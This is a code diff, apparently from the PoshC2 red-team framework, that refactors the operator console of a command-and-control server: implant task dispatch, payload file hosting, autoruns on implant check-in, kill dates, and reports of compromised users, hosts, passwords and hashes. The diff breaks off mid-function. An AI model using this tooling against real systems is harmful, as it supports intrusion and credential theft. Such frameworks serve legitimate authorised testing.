-                        run_implant_command(command, implant_randomuri, implant_id_orig, user)
+                        run_implant_command(command, implant.id, user, numeric_id)
                 else:
-                    run_implant_command(command, implant_randomuri, implant_id_orig, user)
+                    run_implant_command(command, implant.id, user, numeric_id)
 
         except KeyboardInterrupt:
             continue
         except EOFError:
-            new_c2_message("%s logged off." % user)
+            now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+            c2_message = C2Message(
+                message=f"\n{Colours.BLUE}{now}: {user} logged off.{Colours.END}\n",
+                read="No"
+            )
+
+            insert_object(c2_message)
             sys.exit(0)
         except Exception as e:
             traceback.print_exc()
-            print_bad(f"Error running against the selected implant ID, ensure you have typed the correct information: {e}")
+            print_bad(
+                f"Error running against the selected implant ID, ensure you have typed the correct information: {e}")
             return
 
 
-def do_searchhistory(user, command, randomuri):
-    searchterm = (command).replace("searchhistory ", "")
-    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
-        for line in hisfile:
-            if searchterm in line.lower():
-                print(Colours.GREEN + line.replace("+", ""))
-
-
-def do_back(user, command):
-    clear()
-    pass
-
-
-def do_clear(user, command):
-    return do_back(user, command)
-
-
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_generate_reports(user, command):
+    """
+    Generate HTML and CSV reports.
+
+    Reports are generated to the reports directory in the project.
+
+    Examples:
+        generate-reports
+    """
     try:
-        generate_html_table("Tasks")
-        generate_html_table("C2Server")
-        generate_html_table("Creds")
-        generate_html_table("Implants")
-        generate_html_table("URLs")
-        generate_html_table("OpSec_Entry")
+        print("HTML reports:")
+        generate_html_table(Task)
+        # generate_html_table(C2Server) TODO: report is broken
+        generate_html_table(Cred)
+        generate_html_table(Implant)
+        generate_html_table(URL)
+        generate_html_table(OpsecEntry)
+        generate_html_table(MitreTTP)
+        print()
         graphviz()
-        generate_csv("Tasks")
-        generate_csv("C2Server")
-        generate_csv("Creds")
-        generate_csv("Implants")
-        generate_csv("OpSec_Entry")
+        print("CSV reports:")
+        generate_csv(Task)
+        generate_csv(C2Server)
+        generate_csv(Cred)
+        generate_csv(Implant)
+        generate_csv(URL)
+        generate_csv(OpsecEntry)
+        generate_csv(MitreTTP)
         generate_opsec(user, command)
     except PermissionError as e:
         print_bad(str(e))
-    input("Press Enter to continue...")
+        print(Colours.END)
+
+    input("\nPress Enter to continue...")
     clear()
 
 
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_generate_csvs(user, command):
+    """
+    Generate CSV reports only.
+
+    Reports are generated to the reports directory in the project.
+
+    Examples:
+        generate-csvs
+    """
     try:
-        generate_csv("Tasks")
-        generate_csv("C2Server")
-        generate_csv("Creds")
-        generate_csv("Implants")
-        generate_csv("OpSec_Entry")
+        generate_csv(Task)
+        generate_csv(C2Server)
+        generate_csv(Cred)
+        generate_csv(Implant)
+        generate_csv(URL)
+        generate_csv(OpsecEntry)
+        generate_csv(MitreTTP)
     except PermissionError as e:
         print_bad(str(e))
-    input("Press Enter to continue...")
+
+    input("\nPress Enter to continue...")
     clear()
 
 
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_message(user, command):
+    """
+    Broadcast a message to all users, appearing in the C2Server log.
+
+    Examples:
+        message going for lunch
+    """
+    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
     message = command[len("message "):]
-    new_c2_message("Message from %s - %s" % (user, message))
+    c2_message = C2Message(
+        message=f"\n{Colours.BLUE}{now}: Message from {user} - {message}{Colours.END}\n",
+        read="No"
+    )
+
+    insert_object(c2_message)
     clear()
 
 
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_show_urls(user, command):
-    urls = get_c2urls()
-    urlformatted = "ID  Name  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
-    for i in urls:
-        urlformatted += "%s  %s  %s  %s  %s  %s  %s  %s \n" % (i[0], i[1], i[2], i[3], i[4], i[5], i[6], i[7])
-    print_good(urlformatted)
+    """
+    Show all comms URL information, allowing the URLID to be linked to a name and URL details.
+
+    Examples:
+        show-urls
+    """
+    urls = select_all(URL)
+
+    if urls:
+        table = Table(title="Comms URLS", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
+        table.add_column("ID", no_wrap=True, justify="center")
+        table.add_column("Name", no_wrap=True, justify="center")
+        table.add_column("URL", no_wrap=True, justify="center")
+        table.add_column("Host Header", no_wrap=True, justify="center")
+        table.add_column("Proxy URL", no_wrap=True, justify="center")
+        table.add_column("Proxy Username", no_wrap=True, justify="center")
+        table.add_column("Proxy Password", no_wrap=True, justify="center")
+        table.add_column("Credential Expiry", no_wrap=True, justify="center")
+
+        for url in urls:
+            table.add_row(str(url.id), url.name, url.url, url.host_header, url.proxy_url, url.proxy_username,
+                          url.proxy_password, url.credential_expiry)
+
+        console = Console()
+        print(Colours.END)
+        console.print(table)
+        print()
+    else:
+        print_bad("No URLs were set.")
+        print(Colours.END)
+
     input("Press Enter to continue...")
     clear()
 
 
-def get_opsec_events_string(user, command):
-    events = get_opsec_events()
-    if events:
-        eventsformatted = "ID  Date  Owner  Event  Note \n"
-        for i in events:
-            eventsformatted += "%s  %s  %s  %s  %s \n" % (i[0], i[1], i[2], i[3], i[4])
-        return eventsformatted
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_show_opsec_events(user, command):
+    """
+    List all OPSEC events and their details.
 
+    Examples:
+        show-opsec-events
+    """
+    entries = select_all(OpsecEntry)
 
-def do_get_opsec_events(user, command):
-    events_string = get_opsec_events_string(user, command)
-    if (events_string):
-        print_good("\nOpSec Events:")
-        print_good(events_string)
+    if entries:
+        table = Table(title="OpSec Events", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
+        table.add_column("ID", no_wrap=True, justify="center")
+        table.add_column("Date", no_wrap=True, justify="center")
+        table.add_column("Owner", no_wrap=True, justify="center")
+        table.add_column("Event", no_wrap=True, justify="center")
+        table.add_column("Note", no_wrap=True, justify="center")
+
+        for entry in entries:
+            table.add_row(str(entry.id), entry.date, entry.owner, entry.event, entry.note)
+
+        console = Console()
+        print(Colours.END)
+        console.print(table)
+        print()
+    else:
+        print_bad("No opsec events found.")
+        print(Colours.END)
+
     input("Press Enter to continue...")
     clear()
 
 
-def do_del_opsec_events(user, command):
-    delopsec_id = command.lower().replace("del-opsec-event", "").strip()
-    if not delopsec_id:
-        delopsec_id = input("Enter Opsec ID: ")
-    del_opsec_event(delopsec_id)
-    print_good("Opsec Event has been removed\r\n")
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_delete_opsec_event(user, command):
+    """
+    Delete a specific OPSEC event.
+
+    If no Event ID is provided then the user will be prompted for one.
+
+    Examples:
+        delete-opsec-event
+        delete-opsec-event 2
+    """
+    if command.lower() == "delete-opsec-event":
+        opsec_entry_id = input("Enter Opsec Event ID: ")
+        print()
+
+    else:
+        opsec_entry_id = command.lower().replace("delete_opsec_event ", "")
+
+    delete_object(OpsecEntry, {OpsecEntry.id: opsec_entry_id})
+    print_good(f"Opsec Event was successfully removed.{Colours.END}\n")
     input("Press Enter to continue...")
     clear()
 
 
-def do_insert_opsec_events(user, command):
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_add_opsec_event(user, command):
+    """
+    Insert an OPSEC event.
+
+    An OPSEC event is an event that the operator wishes to track and have reported.
+
+    The user will be prompted for details.
+
+    A timestamp can be provided or the current timestamp is used if none is specified.
+
+    The event and any further notes can then be added and will be displayed in the opsec
+    command and in reports.
+
+    Examples:
+        add-opsec-event
+    """
     opsec_timestamp_format = "%Y-%m-%d %H:%M"
     timestamp_string = datetime.now(timezone.utc).strftime(opsec_timestamp_format)
     timestamp = input(f"Timestamp: (Press Enter for {timestamp_string}) ").strip()
+
     if not timestamp:
         timestamp = timestamp_string
+
     if not validate_timestamp_string(timestamp, opsec_timestamp_format):
         print_bad("Please enter a valid timestamp in format yyyy-mm-dd HH:MM")
+        print(Colours.END)
         input("Press Enter to continue...")
         clear()
         return
+
     event = input("Event: ")
     note = input("Notes: ")
-    insert_opsec_event(timestamp, user, event, note)
-    print_good("Event added successfully")
+    opsec_entry = OpsecEntry(
+        date=timestamp,
+        owner=user,
+        event=event,
+        note=note
+    )
+
+    insert_object(opsec_entry)
+    print_good(f"\nOpsec event was successfully added.{Colours.END}")
     do_get_opsec_events(user, command)
 
 
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_show_hosted_files(user, command):
-    hosted_files = get_hosted_files()
-    filesformatted = "ID  URI  FilePath  ContentType  Base64  Active\n"
-    for hosted_file in hosted_files:
-        filesformatted += f"{hosted_file.ID}  {hosted_file.URI}  {hosted_file.FilePath}  {hosted_file.ContentType}  {hosted_file.Base64}  {hosted_file.Active} \n"
-    print_good(filesformatted)
+    """
+    List the files hosted on the C2 webserver and their details.
+
+    Examples:
+        show-hosted-files
+    """
+    hosted_files = select_all(HostedFile)
+
+    if hosted_files:
+        table = Table(title="Hosted Files", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
+        table.add_column("ID", no_wrap=True, justify="center")
+        table.add_column("URI", no_wrap=True, justify="center")
+        table.add_column("File Path", no_wrap=True, justify="center")
+        table.add_column("Content Type", no_wrap=True, justify="center")
+        table.add_column("Base64", no_wrap=True, justify="center")
+        table.add_column("Active", no_wrap=True, justify="center")
+
+        for hosted_file in hosted_files:
+            table.add_row(str(hosted_file.id), hosted_file.uri, hosted_file.file_path, hosted_file.content_type,
+                          hosted_file.base64, hosted_file.active)
+
+        console = Console()
+        print(Colours.END)
+        console.print(table)
+        print()
+    else:
+        print_bad("No files hosted on the C2 web server.")
+        print(Colours.END)
+
     input("Press Enter to continue...")
     clear()
 
 
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_add_hosted_file(user, command):
-    FilePath = input("File Path (e.g. /tmp/application.docx): ")
-    URI = input("URI Path (e.g. /downloads/2020/application): ")
-    ContentType = input("Content Type (e.g. text/html): ")
+    """
+    Add a file to be hosted by the C2 webserver.
+
+    The operator will be prompted for details.
+
+    Allows a Content-Type to be specified and an option is provided to base64 encode
+    the file before serving it.
+
+    Examples:
+        add-hosted-file
+    """
+    FilePath = input("File Path: .e.g. /tmp/application.docx: ")
+    URI = input("URI Path: .e.g. /downloads/2020/application: ")
+    ContentType = input("Content Type: .e.g. (text/html): ")
+
     if ContentType == "":
         ContentType = "text/html"
+
     Base64 = no_yes_prompt("Base64 Encode File")
+
     if not Base64:
         Base64 = "No"
     else:
         Base64 = "Yes"
+
     if not URI or not FilePath:
-        print_bad("Please enter a FilePath and URI")
+        print_bad("File Path or URI was not specified.")
+        print(Colours.END)
         input("Press Enter to continue...")
         clear()
         return
-    insert_hosted_file(URI, FilePath, ContentType, Base64, "Yes")
-    FirstURL = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
-    print_good("Added hosted-file \n\n%s%s -> %s (%s)\r\n" % (FirstURL, URI, FilePath, ContentType))
-    do_show_hosted_files(user, command)
+
+    hosted_file = HostedFile(
+        uri=URI,
+        file_path=FilePath,
+        content_type=ContentType,
+        base64=Base64,
+        active="Yes"
+    )
+
+    insert_object(hosted_file)
+
+    FirstURL = get_first_url(select_first(C2Server.payload_comms_host), select_first(C2Server.domain_front_header))
+    print_good(f"\nHosted file was successfully added.\n\n{FirstURL}{URI} -> {FilePath} ({ContentType}){Colours.END}\n")
     clear()
 
 
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_disable_hosted_file(user, command):
-    hosted_file_id = command.lower().replace("disable-hosted-file ", "")
-    hosted_file_id = command.lower().replace("disable-hosted-file", "").strip()
-    if hosted_file_id == "":
-        hosted_file_id = input("Enter hosted-file ID: ")
-    del_hosted_file(hosted_file_id)
-    print_good("Disabled hosted-file\r\n")
+    """
+    Disables a hosted file, stopping it from being served by the C2 webserver.
+
+    If no hosted file ID is provided then the operator will be prompted for one.
+
+    Examples:
+        disable-hosted-file
+        disable-hosted-file 2
+    """
+    if command.lower() == "disable-hosted-file":
+        hosted_file_id = input("Enter hosted file ID: ")
+        print()
+    else:
+        hosted_file_id = command.lower().replace("disable-hosted-file ", "")
+
+    update_object(HostedFile, {HostedFile.active: "No"}, {HostedFile.id: hosted_file_id})
+    print_good(f"Hosted file was successfully disabled.{Colours.END}\n")
     input("Press Enter to continue...")
     clear()
 
 
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_enable_hosted_file(user, command):
-    hosted_file_id = command.lower().replace("enable-hosted-file ", "")
-    hosted_file_id = command.lower().replace("enable-hosted-file", "").strip()
-    if hosted_file_id == "":
-        hosted_file_id = input("Enter hosted-file ID: ")
-    enable_hosted_file(hosted_file_id)
-    print_good("Enabled hosted-file\r\n")
+    """
+    Enable a hosted file, serving if from the C2 webserver.
+
+    This only has an effect if the file had previously been disabled.
+
+    If no hosted file ID is provided then the operator will be prompted for one.
+
+    Examples:
+        enable-hosted-file
+        enable-hosted-file 2
+    """
+
+    if command.lower() == "enable-hosted-file":
+        hosted_file_id = input("Enter hosted file ID: ")
+        print()
+    else:
+        hosted_file_id = command.lower().replace("enable-hosted-file ", "")
+
+    update_object(HostedFile, {HostedFile.active: "Yes"}, {HostedFile.id: hosted_file_id})
+    print_good(f"Hosted file was successfully enabled.{Colours.END}\n")
     input("Press Enter to continue...")
     clear()
 
 
+@command(server_commands, server_commands_help, server_examples, server_block_help)
 def do_add_autorun(user, command):
-    if command == "add-autorun":
-        print_bad("Please specify a module to autorun")
-        return
-    autorun = command.replace("add-autorun ", "")
-    autorun = autorun.replace("add-autorun", "")
-    add_autorun(autorun)
-    print_good("add-autorun: %s\r\n" % autorun)
-    input("Press Enter to continue...")
-    clear()
+    """
+    Add a task to be automatically run when a PowerShell implant first connects.
 
-
-def do_list_autoruns(user, command):
-    print_good(get_autorun())
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_del_autorun(user, command):
-    autorun = command.replace("del-autorun ", "")
-    del_autorun(autorun)
-    print_good("deleted autorun\r\n")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_nuke_autoruns(user, command):
-    del_autoruns()
-    print_good("nuked autoruns\r\n")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_show_serverinfo(user, command):
-    C2 = get_c2server_all()
-    detailsformatted = "\nPayloadCommsHost: %s\nEncKey: %s\nDomainFrontHeader: %s\nDefaultSleep: %s\nKillDate: %s\nGET_404_Response: %s\nPoshProjectDirectory: %s\nQuickCommand: %s\nDownloadURI: %s\nDefaultProxyURL: %s\nDefaultProxyUser: %s\nDefaultProxyPass: %s\nURLS: %s\nSocksURLS: %s\nInsecure: %s\nUserAgent: %s\nReferer: %s\nPushover_APIToken: %s\nPushover_APIUser: %s\nSlack_UserID: %s\nSlack_Channel: %s\nSlack_BotToken: %s\nEnableNotifications: %s\n" % (C2.PayloadCommsHost, C2.EncKey, C2.DomainFrontHeader, C2.DefaultSleep, C2.KillDate, C2.GET_404_Response, C2.PoshProjectDirectory, C2.QuickCommand, C2.DownloadURI, C2.ProxyURL, C2.ProxyUser, C2.ProxyPass, C2.URLS, C2.SocksURLS, C2.Insecure, C2.UserAgent, C2.Referrer, C2.Pushover_APIToken, C2.Pushover_APIUser, C2.Slack_UserID, C2.Slack_Channel, C2.Slack_BotToken, C2.EnableNotifications)
-    print_good(detailsformatted)
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_turnoff_notifications(user, command):
-    update_item("EnableNotifications", "C2Server", "No")
-    print_good("Turned off notifications on new implant")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_turnon_notifications(user, command):
-    update_item("EnableNotifications", "C2Server", "Yes")
-    print_good("Turned on notifications on new implant")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_set_pushover_applicationtoken(user, command):
-    cmd = command.replace("set-pushover-applicationtoken ", "")
-    cmd = cmd.replace("set-pushover-applicationtoken", "")
-    update_item("Pushover_APIToken", "C2Server", cmd)
-    print_good("Updated Pushover API Token: %s\r\n" % cmd)
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_set_pushover_userkeys(user, command):
-    cmd = command.replace("set-pushover-userkeys ", "")
-    cmd = cmd.replace("set-pushover-userkeys", "")
-    update_item("Pushover_APIUser", "C2Server", cmd)
-    print_good("Updated Pushover User Token: (Restart C2 Server): %s\r\n" % cmd)
-    input("Press Enter to continue...")
-    clear()
-
-def do_set_slack_userid(user, command):
-    cmd = command.replace("set-slack-userid ", "")
-    cmd = cmd.replace("set-slack-userid", "")
-    update_item("Slack_UserID", "C2Server", cmd)
-    print_good("Updated Slack User ID: %s\r\n" % cmd)
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_set_slack_channel(user, command):
-    cmd = command.replace("set-slack-channel ", "")
-    cmd = cmd.replace("set-slack-channel", "")
-    update_item("Slack_Channel", "C2Server", cmd)
-    print_good("Updated Slack Channel: %s\r\n" % cmd)
-    input("Press Enter to continue...")
-    clear()
-
-def do_set_slack_bottoken(user, command):
-    cmd = command.replace("set-slack-bottoken ", "")
-    cmd = cmd.replace("set-slack-bottoken", "")
-    update_item("Slack_BotToken", "C2Server", cmd)
-    print_good("Updated Slack Bot Token: %s\r\n" % cmd)
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_get_killdate(user, command):
-    killdate = select_item("KillDate", "C2Server")
-    print_good(f"KillDate: {killdate}")
-    input("Press Enter to continue...")
-    clear()
-
-
-def do_set_killdate(user, command):
-    new_killdate = command.replace("set-killdate ", "")
-    new_killdate = new_killdate.replace("set-killdate", "").strip()
-    if not validate_killdate(new_killdate):
-        print_bad("Invalid killdate format, please specify a killdate in format yyyy-MM-dd")
+    Examples:
+        add-autorun
+        add-autorun migrate C:\\Windows\\calc.exe
+    """
+    if command.lower() == "add-autorun":
+        autorun_task = input("Enter autorun task: ")
+        print()
     else:
-        update_item("KillDate", "C2Server", new_killdate)
-        print_good("Updated KillDate (Remember to generate new payloads and get new implants): %s\r\n" % new_killdate)
+        autorun_task = command.lower().replace("add-autorun ", "")
+
+    autorun = AutoRun(
+        task=autorun_task
+    )
+
+    insert_object(autorun)
+    print_good(f"Autorun was successfully added.{Colours.END}\n")
     input("Press Enter to continue...")
     clear()
 
 
-def do_set_defaultbeacon(user, command):
-    new_sleep = command.replace("set-defaultbeacon ", "")
-    new_sleep = new_sleep.replace("set-defaultbeacon", "")
-    if not validate_sleep_time(new_sleep):
-        print_bad("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_show_autoruns(user, command):
+    """
+    Show the configured autoruns.
+
+    Autoruns are tasks to be automatically run when a PowerShell implant first connects.
+
+    Examples:
+        show-autoruns
+    """
+    autoruns = select_all(AutoRun)
+
+    if autoruns:
+        table = Table(title="Autoruns", pad_edge=True, show_edge=True, collapse_padding=True, padding=0)
+        table.add_column("ID", no_wrap=True, justify="center")
+        table.add_column("Task", no_wrap=True, justify="center")
+
+        for autorun in autoruns:
+            table.add_row(str(autorun.id), autorun.task)
+
+        console = Console()
+        print(Colours.END)
+        console.print(table)
+        print()
     else:
-        update_item("DefaultSleep", "C2Server", new_sleep)
-        print_good("Updated set-defaultbeacon (Restart C2 Server): %s\r\n" % new_sleep)
+        print_bad("No configured autoruns.")
+        print(Colours.END)
+
     input("Press Enter to continue...")
     clear()
 
 
-def get_opsec_string(user, command):
-    implants = get_implants_all()
-    comtasks = get_tasks()
-    urls = get_c2urls()
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_delete_autorun(user, command):
+    """
+    Removes a configured autorun with a specified ID.
+
+    Examples:
+        delete-autorun
+        delete-autorun 3
+    """
+
+    if command.lower() == "delete-autorun":
+        autorun_id = input("Enter autorun ID: ")
+        print()
+    else:
+        autorun_id = command.lower().replace("delete-autorun ", "")
+
+    delete_object(AutoRun, {AutoRun.id: autorun_id})
+    print_good(f"Autorun was successfully deleted.{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_clear_autoruns(user, command):
+    """
+    Clears all configured autoruns.
+
+    Examples:
+        clear-autoruns
+    """
+    delete_object(AutoRun)
+    print_good(f"Autoruns were successfully cleared.{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_show_server_info(user, command):
+    """
+    Shows the C2 server information presently in use.
+
+    Examples:
+        show-server-info
+    """
+    c2_server = select_first(C2Server)
+
+    if c2_server:
+        details_formatted = f"Payload Comms Host: {c2_server.payload_comms_host}\nEncryption Key: {c2_server.encryption_key}" \
+                            f"\nDomain Front Header: {c2_server.domain_front_header}\nDefault Sleep: {c2_server.default_sleep}" \
+                            f"\nKill Date: {c2_server.kill_date}\nGET 404 Response: {c2_server.get_404_response}" \
+                            f"\nPosh Project Directory: {c2_server.posh_project_directory}\nHosted File URL: {c2_server.hosted_file_url}" \
+                            f"\nDownload URL: {c2_server.download_url}\nProxy URL: {c2_server.proxy_url}\nProxy Username: {c2_server.proxy_username}" \
+                            f"\nProxy Password: {c2_server.proxy_password}\nURLs: {c2_server.urls}\nSocks URLs: {c2_server.socks_urls}" \
+                            f"\nInsecure: {c2_server.insecure}\nUser Agent: {c2_server.user_agent}\nReferer: {c2_server.referer}" \
+                            f"\nPushover API Token: {c2_server.pushover_api_token}\nPushover API User: {c2_server.pushover_api_user}" \
+                            f"\nSlack User ID: {c2_server.slack_user_id}\nSlack Channel: {c2_server.slack_channel}" \
+                            F"\nSlack Bot Token: {c2_server.slack_bot_token}\nNotifications Enabled: {c2_server.notifications_enabled}"
+
+        print_good(f"{details_formatted}{Colours.END}\n")
+    else:
+        print_bad("No C2 Server configured.")
+        print(Colours.END)
+
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_disable_notifications(user, command):
+    """
+    Turns off Pushover notifications.
+
+    Examples:
+        enable-notifications
+    """
+    update_object(C2Server, {C2Server.notifications_enabled: "No"})
+    print_good(f"Turned off notifications on new implant.{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_enable_notifications(user, command):
+    """
+    Turns on Pushover notifications.
+
+    Examples:
+        disable-notifications
+    """
+    update_object(C2Server, {C2Server.notifications_enabled: "Yes"})
+    print_good(f"Turned on notifications on new implant.{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_set_pushover_token(user, command):
+    """
+    Sets the Pushover Application Token to use for notifications.
+
+    Examples:
+        set-pushover-token
+        set-pushover-token 00000000000000
+    """
+    if command.lower() == "set-pushover-token":
+        pushover_token = input("Enter Pushover API Token: ")
+        print()
+    else:
+        pushover_token = command.lower().replace("set-pushover-token ", "")
+
+    update_object(C2Server, {C2Server.pushover_api_token: pushover_token})
+    print_good(f"Pushover API Token was updated successfully.{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_set_pushover_user(user, command):
+    """
+    Sets the Pushover User Key to use for notifications.
+
+    Examples:
+        set-pushover-user
+        set-pushover-user 00000000000000
+    """
+    if command.lower() == "set-pushover-user":
+        pushover_user = input("Enter Pushover API User: ")
+        print()
+    else:
+        pushover_user = command.lower().replace("set-pushover-user ", "")
+
+    update_object(C2Server, {C2Server.pushover_api_user: pushover_user})
+    print_good(f"Pushover API User was updated successfully.{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_get_kill_date(user, command):
+    """
+    Get the kill date currently set for the C2 server.
+
+    Examples:
+        get-kill-date
+    """
+    kill_date = select_first(C2Server.kill_date)
+    print_good(f"Kill Date: {kill_date}{Colours.END}\n")
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_set_kill_date(user, command):
+    """
+    Sets the kill date to use for new payloads and implant only.
+
+    Examples:
+        set-kill-date
+        set-kill-date 1970-01-01
+    """
+    if command.lower() == "set-kill-date":
+        kill_date = input("Enter new kill date: ")
+        print()
+    else:
+        kill_date = command.lower().replace("set-kill-date ", "")
+
+    if not validate_kill_date(kill_date):
+        print_bad("Invalid kill date format, please specify a kill date in format yyyy-MM-dd")
+        print(Colours.END)
+    else:
+        update_object(C2Server, {C2Server.kill_date: kill_date})
+        print_good(
+            f"Kill date was updated successfully.\n{Colours.YELLOW}Remember to generate new payloads and get new implants!{Colours.END}\n")
+
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_set_default_beacon(user, command):
+    """
+    Sets the default beacon interval for new payloads and implants.
+
+    Examples:
+        set-default-beacon
+        set-default-beacon 10s
+    """
+    if command.lower() == "set-default-beacon":
+        default_sleep = input("Enter new beacon interval: ")
+        print()
+    else:
+        default_sleep = command.lower().replace("set-default-beacon ", "")
+
+    if not validate_sleep_time(default_sleep):
+        print_bad("Invalid beacon interval, please specify a value such as 50s, 10m or 1h")
+        print(Colours.END)
+    else:
+        update_object(C2Server, {C2Server.default_sleep: default_sleep})
+        print_good(f"Default beacon interval was updated successfully.{Colours.END}\n")
+
+    input("Press Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_opsec(user, command):
+    """
+    Show OPSEC information automatically extracted from activity, such as URLs in use,
+    credentials harvested and so on.
+
+    Examples:
+        opsec
+    """
+    implants = select_all(Implant)
+    tasks = select_all(Task)
+    urls = select_all(URL)
     users = ""
     hosts = ""
     uploads = ""
     creds = ""
     hashes = ""
-    urlformatted = "ID  Name  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
-    for i in (urls or []):
-        urlformatted += "%s  %s  %s  %s  %s  %s  %s  %s \n" % (i[0], i[1], i[2], i[3], i[4], i[5], i[6], i[7])
+    formatted_urls = "ID  Name  URL  HostHeader  ProxyURL  ProxyUsername  ProxyPassword  CredentialExpiry\n"
+
+    for url in (urls or []):
+        formatted_urls += f"{url.id}  {url.name}  {url.url}  {url.host_header}  {url.proxy_url}  {url.proxy_username}  {url.proxy_password}  {url.credential_expiry}\n"
+
     for implant in (implants or []):
-        if implant.Hostname not in hosts:
-            hosts += "%s \n" % implant.Hostname
-    for task in (comtasks or []):
-        implant = get_implantdetails(task[1])
-        command = task[2].lower()
-        output = task[3].lower()
-        if implant.User not in users:
-            users += "%s\\%s @ %s\n" % (implant.Domain, implant.User, implant.Hostname)
-        if "invoke-pbind" in command and "connected" in output:
-            tg = re.search("(?<=-target )\\S*", str(command))
-            if tg[0] not in hosts:
-                hosts += "%s \n" % tg[0]
+        if implant.hostname not in hosts:
+            hosts += f"{implant.hostname} \n"
+
+    for task in (tasks or []):
+        implant = get_implant(task.implant_id)
+        command = task.command.lower()
+        output = task.output.lower()
+
+        if implant.user not in users:
+            users += f"{implant.domain}\\{implant.user} @ {implant.hostname}\n"
+
         if "uploading file" in command:
             uploadedfile = command
             uploadedfile = uploadedfile.partition("uploading file: ")[2].strip()
             filehash = uploadedfile.partition(" with md5sum:")[2].strip()
             uploadedfile = uploadedfile.partition(" with md5sum:")[0].strip()
             uploadedfile = uploadedfile.strip('"')
-            uploads += "%s @ %s\t%s\t%s\n" % (implant.User,implant.Hostname, filehash, uploadedfile)
+            uploads += f"{implant.domain}\\{implant.user} @ {implant.hostname}\t{filehash}\t{uploadedfile}\n"
+
         if "installing persistence" in output:
             line = command.replace('\n', '')
             line = line.replace('\r', '')
             filenameuploaded = line.rstrip().split(":", 1)[1]
-            uploads += "%s %s \n" % (implant.User, filenameuploaded)
+            uploads += f"{implant.user} {filenameuploaded} \n"
+
         if "written scf file" in output:
-            uploads += "%s %s \n" % (implant.User, output)
-        creds, hashes = parse_creds(get_creds())
-    return (f"\nUsers Compromised: \n{users}\nHosts Compromised: \n{hosts}\nURLs: \n{urlformatted}\nFiles Uploaded: \n{uploads}\nCredentials Compromised: \n{creds}\nHashes Compromised: \n{hashes}")
+            uploads += f"{implant.user} {output} \n"
+
+        creds, hashes = parse_creds(select_all(Cred))
+
+    print_good(
+        f"\nURLs: \n{formatted_urls}\nUsers Compromised: \n{users}\nHosts Compromised: \n{hosts}\nPasswords Compromised: \n{creds}\nHashes Compromised: \n{hashes}\nFiles Uploaded: \n{uploads}{Colours.END}")
+    input("\nPress Enter to continue...")
+    clear()
 
 
-def do_opsec(user, command):
-    print_good(get_opsec_string(user, command))
-    do_get_opsec_events(user, command)
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_list_modules(user, command):
+    """
+    List all available modules for all implant types.
+
+    Examples:
+        list-modules
+    """
+    modules = os.listdir(ModulesDirectory)
+    modules = sorted(modules, key=lambda s: s.lower())
+
+    for module in modules:
+        print_good(f"{module}{Colours.END}")
+
+    input("\nPress Enter to continue...")
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help, name="p")
+def do_pwn_self(user, command):
+    """
+    Obtain a Python2 implant on the C2 server by running the Python2 payload locally.
+
+    Examples:
+        pwn-self
+    """
+    subprocess.Popen(["python2.7", f"{PayloadsDirectory}{'py_dropper.py'}"])
+    clear()
+
+
+@command(server_commands, server_commands_help, server_examples, server_block_help)
+def do_tasks(user, command):
+    """
+    Show all queued tasks.
+
+    Examples:
+        tasks
+    """
+    tasks_formatted = ""
+    tasks = select_all(NewTask)
+
+    if tasks is None:
+        print_bad("No tasks queued at this time!")
+        print(Colours.END)
+    else:
+        for task in tasks:
+            implant = get_implant(task.implant_id)
+
+            if implant.numeric_id is not None:
